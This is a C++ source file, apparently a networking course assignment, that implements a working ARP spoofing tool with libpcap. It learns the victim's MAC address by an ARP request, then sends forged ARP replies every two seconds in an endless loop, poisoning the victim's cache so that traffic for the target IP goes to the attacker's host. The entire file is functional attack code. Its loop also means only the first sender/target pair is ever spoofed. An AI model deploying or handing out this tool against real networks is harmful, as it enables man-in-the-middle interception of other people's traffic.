#include <cstdio>
#include <pcap.h>
#include <cstring>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <vector>
#include <ctime>

#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)


Mac getMyMac(const char* ifname) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return Mac::nullMac();
    struct ifreq ifr;
    std::strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) != 0) {
        close(fd);
        return Mac::nullMac();
    }
    close(fd);
    return Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
}


Ip getMyIp(const char* ifname) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return Ip("0.0.0.0");
    struct ifreq ifr;
    std::strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);
    if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) {
        close(fd);
        return Ip("0.0.0.0");
    }
    close(fd);
    return Ip(ntohl(reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr)->sin_addr.s_addr));
}


Mac getMacByArpRequest(pcap_t* pcap, Mac attackerMac, Ip attackerIp, Ip senderIp) {
    EthArpPacket req{};
    req.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    req.eth_.smac_ = attackerMac;
    req.eth_.type_ = htons(EthHdr::Arp);

    req.arp_.hrd_ = htons(ArpHdr::ETHER);
    req.arp_.pro_ = htons(EthHdr::Ip4);
    req.arp_.hln_ = Mac::SIZE;
    req.arp_.pln_ = Ip::SIZE;
    req.arp_.op_ = htons(ArpHdr::Request);
    req.arp_.smac_ = attackerMac;
    req.arp_.sip_ = htonl(attackerIp);
    req.arp_.tmac_ = Mac::nullMac();
    req.arp_.tip_ = htonl(senderIp);

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&req), sizeof(EthArpPacket));


    time_t start_time = std::time(nullptr);
    while (std::time(nullptr) - start_time < 3) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res <= 0) continue;

        EthArpPacket* recv = (EthArpPacket*)packet;
        if (ntohs(recv->arp_.op_) == ArpHdr::Reply && recv->arp_.sip() == senderIp) {

            return recv->arp_.smac();
        }
    }

    return Mac::nullMac();
}


void sendArpSpoof(pcap_t* pcap, Mac attackerMac, Mac senderMac, Ip senderIp, Ip targetIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = attackerMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = attackerMac;
    packet.arp_.sip_ = htonl(targetIp);
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(senderIp);


    while (true) {
        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {

        } else {

        }
        sleep(2);
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {

        return -1;
    }

    char* dev = argv[1];
    Mac attackerMac = getMyMac(dev);
    Ip attackerIp = getMyIp(dev);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!pcap) {

        return -1;
    }

    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]);
        Ip targetIp(argv[i + 1]);
        Mac senderMac = getMacByArpRequest(pcap, attackerMac, attackerIp, senderIp);

        if (senderMac == Mac::nullMac()) {

            continue;
        }


        sendArpSpoof(pcap, attackerMac, senderMac, senderIp, targetIp);
    }

    pcap_close(pcap);
    return 0;
}
